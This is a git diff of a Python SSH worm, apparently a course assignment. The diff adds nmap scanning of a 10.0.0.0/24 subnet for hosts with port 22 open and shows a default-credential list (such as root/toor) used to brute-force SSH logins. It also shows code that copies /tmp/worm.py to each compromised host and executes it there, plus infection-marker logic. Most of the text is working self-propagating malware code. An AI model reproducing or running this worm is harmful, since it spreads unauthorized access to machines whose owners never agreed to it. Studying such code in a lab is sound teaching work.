@@ -13,8 +13,6 @@ import os.path
 import netifaces
 from netifaces import interfaces, ifaddresses, AF_INET
 
-nmScan = nmap.PortScanner('10.0.0.0/23', arguments='--open')
-
 # The list of credentials to attempt
 credList = [
 ('root', 'toor'),
@@ -75,7 +73,7 @@ def markInfected():
 		f.write("filler text")
 		f.close()
 		# /kevin
-	pass	
+	
 
 ###############################################################
 # Spread to the other system and execute
@@ -106,7 +104,7 @@ def spreadAndExecute(sshClient):
 	sftpClient.put("/tmp/worm.py", "/tmp/worm.py")
 	sshClient.exec_command("python3 /tmp/worm.py")
 	# sshClient.exec_command("for i in {1..5}: do logger")
-	pass
+	
 
 ############################################################
 # Try to connect to the given host given the existing
@@ -242,7 +240,10 @@ def getHostsOnTheSameNetwork():
 	# TODO: Add code for scanning
 	# for hosts on the same network
 	# and return the list of discovered
-	# IP addresses.	
+	# IP addresses.
+	nmScan = nmap.PortScanner()
+
+	nmScan.scan('10.0.0.0/24', arguments='-p 22--open')
 	# kevin
 	hostInfo = nmScan.all_hosts()
 	liveHosts = []
@@ -264,6 +265,7 @@ def getHostsOnTheSameNetwork():
 # an alternative approach is to hardcode the origin system's
 # IP address and have the worm check the IP of the current
 # system against the hardcoded IP. 
+print("1")
 if len(sys.argv) < 2:
 	
 	# TODO: If we are running on the victim, check if 
@@ -272,20 +274,23 @@ if len(sys.argv) < 2:
 	# Desirae Prather 
 	if isInfectedSystem()==1:
 		#terminate
+		print("2")
 		exit(1)
 	else:
 		# infect victim
 		markInfected()
 	# /DesiraePrather
 		
-	pass
-
+print("3")
 # TODO: Get the IP of the current system
 # Desirae Prather
 interface = interfaces()
 currentIP = getMyIP(interface)
 # /Desirae Prather
 
+# kevin
+print(currentIP)
+# /kevin
 # Get the hosts on the same network
 networkHosts = getHostsOnTheSameNetwork()
 
@@ -293,8 +298,16 @@ networkHosts = getHostsOnTheSameNetwork()
 # from the list of discovered systems (we
 # do not want to target ourselves!).
 # yujin
-networkHosts.remove(currentIP)
+# networkHosts.remove(currentIP)
 # /yujin
+
+# kevin temporary
+try:
+	networkHosts.remove(currentIP)
+except ValueError:
+	print("we got a value error but go on...")
+
+# /kevin
 print("Found hosts: ", networkHosts)
 
 
